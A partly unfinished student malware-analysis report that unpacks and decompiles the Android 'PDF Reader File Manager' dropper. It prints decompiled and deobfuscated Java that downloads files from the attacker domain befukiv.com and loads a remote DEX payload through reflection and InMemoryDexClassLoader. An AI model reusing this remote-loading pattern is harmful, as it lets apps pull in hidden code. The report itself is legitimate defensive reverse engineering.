# Introduction

For our reverse engineering course, we have decided to analyze and reverse engineer the "PDF Reader File Manager" application, which was known for being removed from the Play Store earlier this year. It was developed to steal data from Android users, as explained in this article [here](https://www.tomsguide.com/computing/malware-adware/these-malicious-android-malware-apps-were-downloaded-150000-times-from-the-play-store-delete-them-right-now).

# Environment and Tools

## Environment
To explore this application, we first focused on using a **secure environment** where we could ensure that the finding **wouldn't harm** the host system, and prevent the **system from tainting** any of the possible findings.

We used Vagrant to set up a [Kali box](https://app.vagrantup.com/kalilinux/boxes/rolling) where we could import the provided raw files for evaluation. Also [REMnux Docker container](https://docs.remnux.org/install-distro/remnux-as-a-container) was used for further forensic exploration.

## Tools

# Exploration Steps & Findings

## Unpack

Unziping the file with `7za PDF_Reader_File_Manager.zip` results in the files and directory shown below.

![From the zip archive](./imgs/Screenshot%20from%202024-03-08%2017-30-10.png)

With a little investigation, we can discover that XAPK files are just a bundle of APKs with other files. To retrieve these we can again use `7za` and run it with the XAPK file. E now have multiple APKs, a PNG and a JSON file.

![Extracted files](./imgs/Screenshot%20from%202024-03-05%2000-41-49.png)

When trying to run `apktool d 1.apk` or `jadx -d out 1.apk`, we are confronted with some error. This does not happen with any other APK, so inspecting the file signatures, we can find that **1.apk is not a clean APK** file.

Indeed, if we try to unzip the file, we can retrieve multiple files.

## Decompiling

We now have a large set of files from the application, however, many of them are not relevant to what we are trying to achieve and can blur our view over the whole of the application. 

From all of the APKs found, the first focus on the _com.tragisoap.fileandpdfmanager.apk_ has it probably is the main application, and if anything malicious is to happen, it should first come from here.

Using `apktool`, we can expose the inner contents of the bundle. To do this we can use the following command:

```bash
apktool d -r -s com.tragisoap.fileandpdfmanager.apk
```

From this, the most important file is the _classes.dex_ file, from which we can reassemble the Java class files. To do this we can use `jadx` with the command:

```bash
jadx -d out classes.dex
```

## Walkthrough

The main application files are present at **com.tragisoap.fileandpdfmanager**, so it makes sense to start from here our search. Most of the files appear harmless, but when coming across the class _PartPreviewActivity_, we can notice some strange patterns in the code.

```java
public final void onCreate(Bundle bundle) {
    String str;
    String str2 = "tura dar";
    super.onCreate(bundle);
    s().t(1);
    getWindow().setStatusBarColor(0);
    setContentView(2131492981);
    TextView textView = (TextView) findViewById(2131296755);
    try {                                                               // First try
        m.f3835d.invoke(null, this);                
    } catch (IllegalAccessException | InvocationTargetException e) {
        e.printStackTrace();
    }
    Button button = (Button) findViewById(2131296492);
    try {                                                               // Second try
        str = (String) m.f3833b.invoke(null, new Object[0]);
    } catch (IllegalAccessException | InvocationTargetException e7) {
        e7.printStackTrace();
        str = "tura dar";
    }
    textView.setText(str);
    try {                                                               // Third try
        str2 = (String) m.f3834c.invoke(null, new Object[0]);
    } catch (IllegalAccessException | InvocationTargetException e8) {
        e8.printStackTrace();
    }
    button.setText(str2);
    button.setOnClickListener(new q(4, this));
}
```

It is not that common for an application to successively try and expect the same exception in such a short time, and this may suggest that the developer expects some kind of resistance from the system. The most concerning section however is present on the _onNewIntent_ method of the same class, where we find that the application requests information of the system regarding its **package installation permissions** as a condition for an action.

```java
public final void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    Bundle extras = intent.getExtras();
    if ("com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED".equals(intent.getAction()) && extras.getInt("android.content.pm.extra.STATUS") == -1) {
        startActivity((Intent) extras.get("android.intent.extra.INTENT"));
    }
}
```

Looking back at the successive tty, using `JADX` we can find where the methods that are trying to be triggered are declared. We renamed the class that defines them to _Malicious_.

### Exploring Application External Accesses

In the _Malicious_ class, we can see that it downloads additional files from external services.

```java
public static void a() {
    String str;
    Session session = new Session();
    HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
    getrequest.request("https://befukiv.com/muchaspuchas");
    HttpHandler call = getrequest.call();
    HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
    getrequest2.request("https://befukiv.com/cortina");
    HttpHandler call2 = getrequest2.call();
    try {
        ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
        byte[] parse = parseHttpResponseBody.parse();
        TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
        Charset charset = z4.h.utf8Charset;
        if (twoStrings != null && (str = twoStrings.secondStr) != null) {
            charset = Charset.forName(str);
        }
        muchasStrings.set(new String(parse, charset.name()).split("\\|"));
        byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
        if (fetchAndProcessCompleted.get()) {
            return;
        }
        fw.getClass();
        WriterFile.mapMuchasPuchasToMethods(parse2);
        fetchAndProcessCompleted.set(true);
    } catch (Throwable th) {
        th.printStackTrace();
    }
}
```

Although it's obfuscated, we can see that it's accessing files from the domain **befukiv.com**. A DNS search reveals that this domain has two name servers pointing to domains in Russia.

```
...
Registrant Email: http://whois.nicenic.net/?page=whoisform
Admin Email: http://whois.nicenic.net/?page=whoisform&emailtype=admin
Tech Email: http://whois.nicenic.net/?page=whoisform&emailtype=tech
Name Server: NS1.ERANS.RU
Name Server: NS2.ERANS.RU
DNSSEC: unsigned
...
```

At the time this report is being written, the server is accessible, but the resources are not available (it returns a 'not found' response).

But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.

### Exploring 'muchaspuchas' and 'cortina' files

The 'muchaspuchas' file is composed of what seems to be Java method or class names separated by the | character. The function where this file is being downloaded splits the file contents by the | character.

```
dalvik.system.InMemoryDexClassLoader|getClassLoader|loadClass|com.travisscott.pdf.MainLibrary|...
```

Given that information, we may assume that Java code is parsing these names and then calling them through reflection.

## Exploring readable files

We can see that inside function a() (obfuscated) a string is being split by the '|' character. To make it more clear we performed deofuscation and achieved the following result

```java
public static void fetchFilesAndProcess() {
        String str;
        Session session = new Session();
        HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
        getrequest.request("https://befukiv.com/muchaspuchas");
        HttpHandler call = getrequest.call();
        HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
        getrequest2.request("https://befukiv.com/cortina");
        HttpHandler call2 = getrequest2.call();
        try {
            ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
            byte[] parse = parseHttpResponseBody.parse();
            TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
            Charset charset = z4.h.utf8Charset;
            if (twoStrings != null && (str = twoStrings.secondStr) != null) {
                charset = Charset.forName(str);
            }
            muchasStrings.set(new String(parse, charset.name()).split("\\|"));
            byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
            if (fetchAndProcessCompleted.get()) {
                return;
            }
            fw.getClass();
            FileWriter.mapMuchasStringsToMethods(parse2);
            fetchAndProcessCompleted.set(true);
        } catch (Throwable th) {
            th.printStackTrace();
        }
    }
```

As we can see, the function is fetching the files and is then it maps 'muchaspuchas' strings into application methods.
This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way
```java
    public static void mapMuchasPuchasToMethods(byte[] bArr) {
        Class inMemoryDexClassLoader = (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[0]); // dalvik.system.InMemoryDexClassLoader
        Class cls = (Class) inMemoryDexClassLoader.getMethod(Malicious.muchasStrings.get()[2], String.class).invoke(inMemoryDexClassLoader.getConstructor((Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[11]), (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[12])).newInstance(ByteBuffer.wrap(bArr), Class.class.getMethod(Malicious.muchasStrings.get()[1], new Class[0]).invoke(Malicious.class, new Object[0])), Malicious.muchasStrings.get()[3]);
        Malicious.makePdfPage = getClassMethod(cls, Malicious.muchasStrings.get()[10], Context.class);
        Malicious.readPdfFile = getClassMethod(cls, Malicious.muchasStrings.get()[7], Context.class);
        Malicious.getFirstText = getClassMethod(cls, Malicious.muchasStrings.get()[5], new Class[0]);
        Malicious.getSecondText = getClassMethod(cls, Malicious.muchasStrings.get()[6], new Class[0]);
        Method init = getClassMethod(cls, Malicious.muchasStrings.get()[4], Class.class, Class.class);
        Malicious.launch = getClassMethod(cls, Malicious.muchasStrings.get()[9], Context.class);
        Malicious.getName = getClassMethod(cls, Malicious.muchasStrings.get()[8], Context.class);
        init.invoke(null, PartPreviewActivity.class, MainActivity.class);
    }
```

From that, we can see that the function is using java reflection to dynamically assign variables of Malicious class based on methods/classes names obtained from muchaspuchas file.

`mapMuchasStringsToMethods` receives as an argument a byte array containing data from `cortina` file. It seems that it's loading a class based on the binary file. Based on that we decided to analyze as a next step, to analyze cortina file.


### Exploring cortina file
[TODO]...



TODO
1. muchaspuchas maybe a CSV type file
2. Based on 1., we look for split functions.
3. Explore 'mapMuchasPuchasToMethods' line 2 (Class cls = (Class) inMemory...)





Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.
